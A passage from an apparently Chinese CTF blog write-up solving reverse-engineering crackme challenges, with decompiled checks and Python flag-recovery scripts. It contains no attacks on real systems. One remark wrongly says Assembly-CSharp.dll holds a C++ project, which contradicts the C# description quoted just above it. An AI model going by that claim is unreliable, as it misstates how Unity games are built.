&lt;&lt; <span class="number">6</span>) + *table) ^ ((v4 &gt;&gt; <span class="number">9</span>) + table[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">    v4 += (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + table[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + table[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *temp = v3;</span><br><span class="line">  result = v4;</span><br><span class="line">  temp[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我看网上都是c写的，想试试py，但是还要看其他的内容，先鸽了</p><h1 id="0x14-MRCTF2020-Xor"><a href="#0x14-MRCTF2020-Xor" class="headerlink" title="0x14.[MRCTF2020]Xor"></a>0x14.[MRCTF2020]Xor</h1><p>简单的一个异或：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">local = [<span class="number">0x4D</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0x58</span>, <span class="number">0x5A</span>, <span class="number">0x3A</span>,</span><br><span class="line">         <span class="number">0x4A</span>, <span class="number">0x3A</span>, <span class="number">0x60</span>, <span class="number">0x74</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x40</span>, <span class="number">0x20</span>,</span><br><span class="line">         <span class="number">0x62</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x7D</span>, <span class="number">0x38</span>, <span class="number">0x67</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(local)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ local[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="0x15-FlareOn4-IgniteMe"><a href="#0x15-FlareOn4-IgniteMe" class="headerlink" title="0x15.[FlareOn4]IgniteMe"></a>0x15.[FlareOn4]IgniteMe</h1><p>无壳，打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+0h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hFile = GetStdHandle(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  dword_403074 = GetStdHandle(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  WriteFile(dword_403074, aG1v3M3T3hFl4g, <span class="number">0x13</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  sub_4010F0();</span><br><span class="line">  <span class="keyword">if</span> ( sub_401050() )</span><br><span class="line">    WriteFile(dword_403074, aG00dJ0b, <span class="number">0xA</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    WriteFile(dword_403074, aN0tT00H0tRWe7r, <span class="number">0x24</span>u, &amp;NumberOfBytesWritten, <span class="number">0</span>);</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的sub_4010F0就是去了\r和\n，下面是sub_401050：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401050</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  len = sub_401020(byte_403078);</span><br><span class="line">  v4 = sub_401000();</span><br><span class="line">  <span class="keyword">for</span> ( i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_403180[i] = v4 ^ byte_403078[i];</span><br><span class="line">    v4 = byte_403078[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">0x27</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_403180[j] != local_str[j] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是个异或，且v4第一开始是4，调出来的，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">local_str = [<span class="number">0x0D</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x6C</span>,</span><br><span class="line">             <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x45</span>, <span class="number">0x12</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x44</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>,</span><br><span class="line">             <span class="number">0x56</span>, <span class="number">0x09</span>, <span class="number">0x5F</span>, <span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>,</span><br><span class="line">             <span class="number">0x17</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x4D</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x69</span>]</span><br><span class="line">local_str.reverse()</span><br><span class="line">v4 = <span class="number">4</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(local_str)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(local_str[i] ^ v4)</span><br><span class="line">    v4 = local_str[i] ^ v4</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h1 id="0x16-MRCTF2020-hello-world-go"><a href="#0x16-MRCTF2020-hello-world-go" class="headerlink" title="0x16.[MRCTF2020]hello_world_go"></a>0x16.[MRCTF2020]hello_world_go</h1><p>说实话没看懂在搞啥，就看到memequal和cmpstring两个函数就拿到flag了。</p><h1 id="0x17-WUSTCTF2020-level3"><a href="#0x17-WUSTCTF2020-level3" class="headerlink" title="0x17.[WUSTCTF2020]level3"></a>0x17.[WUSTCTF2020]level3</h1><p>是一个变表的base64，虽然能看到变表的函数，但是不知道在哪里调用的。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">string</span></span><br><span class="line">str0 = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span></span><br><span class="line">string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">string1 = <span class="built_in">list</span>(</span><br><span class="line">    <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">10</span>):</span><br><span class="line">    string1[i], string1[<span class="number">19</span>-i] = string1[<span class="number">19</span>-i], string1[i]</span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&#x27;&#x27;.join(string1)</span></span><br><span class="line"><span class="string">print(base64.b64decode(str0.translate(str.maketrans(string1, string2))))</span></span><br></pre></td></tr></table></figure><h1 id="0x18-WUSTCTF2020-Cr0ssfun"><a href="#0x18-WUSTCTF2020-Cr0ssfun" class="headerlink" title="0x18.[WUSTCTF2020]Cr0ssfun"></a>0x18.[WUSTCTF2020]Cr0ssfun</h1><p>check里面啥都有</p><h1 id="0x19-FlareOn6-Overlong"><a href="#0x19-FlareOn6-Overlong" class="headerlink" title="0x19.[FlareOn6]Overlong"></a>0x19.[FlareOn6]Overlong</h1><p>ida不太会改，就od了，首先他是因为push了1c的长度，而需要显示的长度远大于0x1c，所以将它改大一些就OK，这里直接在stack上改的：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031173412785.png" alt="image-20211031173412785"></p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031173430925.png" alt="image-20211031173430925"></p><h1 id="0x1A-BJDCTF2020-BJD-hamburger-competition"><a href="#0x1A-BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="0x1A.[BJDCTF2020]BJD hamburger competition"></a>0x1A.[BJDCTF2020]BJD hamburger competition</h1><blockquote><p>  <strong>识别Unity游戏</strong></p><p>  Android平台的apk包可以直接解压，看是否有./assets/bin/Data/Managed目录，也可以查看lib文件夹下面包含的一些so，如果有libmono,libunity等模块，基本可以确定是unity游戏了。</p><p>  Android平台中C#编写的主逻辑模块代码静态编辑之后存储于Assembly-CSharp.dll文件中。因为unity的跨平台，Android平台是unity编译的游戏，那么其对应的IOS平台上也是unity编译出来的。如果希望直接从IOS上面去看是否是unity游戏，可以提取游戏中的主模块查看是否有unity之类的函数即可。</p><p>  转自：<a href="https://www.52pojie.cn/thread-495115-1-1.html">https://www.52pojie.cn/thread-495115-1-1.html</a></p></blockquote><p>第一次做unity的题，unity是C++写的，所以这里使用dnspy直接看源码，在BJD hamburger competition_Data\Managed文件夹中找到Assembly-CSharp.dll（进去文件后第一个就是），这个dll文件是程序的源码，用来存放C++工程。</p><p>Assembly-CSharp.dll这个文件很重要。</p><p>之后在buttonspawnfruit看到：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031175420892.png" alt="image-20211031175420892"></p><p>解密之后md5，要注意的是md5返回的是前20位：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211031175939675.png" alt="image-20211031175939675"></p><h1 id="0x1B-ACTF新生赛2020-Oruga"><a href="#0x1B-ACTF新生赛2020-Oruga" class="headerlink" title="0x1B.[ACTF新生赛2020]Oruga"></a>0x1B.[ACTF新生赛2020]Oruga</h1><p>重点在sub_78A</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">6</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">6</span>]; <span class="comment">// [rsp+Ah] [rbp-36h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x19</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me the flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s2, <span class="string">&quot;actf&#123;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    s1[i] = input[i];</span><br><span class="line">  s1[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_78A(input) )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s True Flag!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t stop trying...&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Format false!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_78A:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_78A</span><span class="params">(<span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> now; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  now = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">5</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">map</span>[now] != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    now -= v4;</span><br><span class="line">    <span class="keyword">if</span> ( input[v3] != <span class="string">&#x27;W&#x27;</span> || v4 == <span class="number">0xFFFFFFF0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input[v3] != <span class="string">&#x27;E&#x27;</span> || v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( input[v3] != <span class="string">&#x27;M&#x27;</span> || v4 == <span class="number">0x10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( input[v3] != <span class="string">&#x27;J&#x27;</span> || v4 == <span class="number">0xFFFFFFFF</span> )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          v4 = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="number">0x10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0xFFFFFFF0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v3;</span><br><span class="line">    <span class="keyword">while</span> ( !<span class="built_in">map</span>[now] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">-1</span> &amp;&amp; (now &amp; <span class="number">0xF</span>) == <span class="number">0</span> )       <span class="comment">// 在最左边</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> &amp;&amp; now % <span class="number">16</span> == <span class="number">15</span> )          <span class="comment">// 在最右边</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">0x10</span> &amp;&amp; (now - <span class="number">240</span>) &lt;= <span class="number">15</span> )    <span class="comment">// 在最后一行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">0xFFFFFFF0</span> &amp;&amp; (now + <span class="number">15</span>) &lt;= <span class="number">30</span> )<span class="comment">// 在第一行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      now += v4;                                <span class="comment">// 每次可以一直走</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> input[v3] == <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次只要没撞到墙都可以一直走</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="built_in">map</span>[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,  <span class="number">35</span>,  <span class="number">35</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">80</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">76</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">80</span>, </span><br><span class="line">   <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">76</span>,   <span class="number">0</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">76</span>,  <span class="number">76</span>,   <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">79</span>,  <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">80</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">77</span>,  <span class="number">77</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">77</span>,  <span class="number">77</span>,  <span class="number">77</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,  <span class="number">69</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">69</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,  <span class="number">69</span>,  <span class="number">84</span>,  <span class="number">84</span>, </span><br><span class="line">   <span class="number">84</span>,  <span class="number">73</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">0</span>,  <span class="number">73</span>,   <span class="number">0</span>,  <span class="number">77</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">0</span>,  <span class="number">73</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,  <span class="number">77</span>, </span><br><span class="line">   <span class="number">33</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,  <span class="number">69</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//MEWEMEWJMEWJM</span></span><br></pre></td></tr></table></figure><h1 id="0x1C-FlareOn3-Challenge1"><a href="#0x1C-FlareOn3-Challenge1" class="headerlink" title="0x1C.[FlareOn3]Challenge1"></a>0x1C.[FlareOn3]Challenge1</h1><p>无壳，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 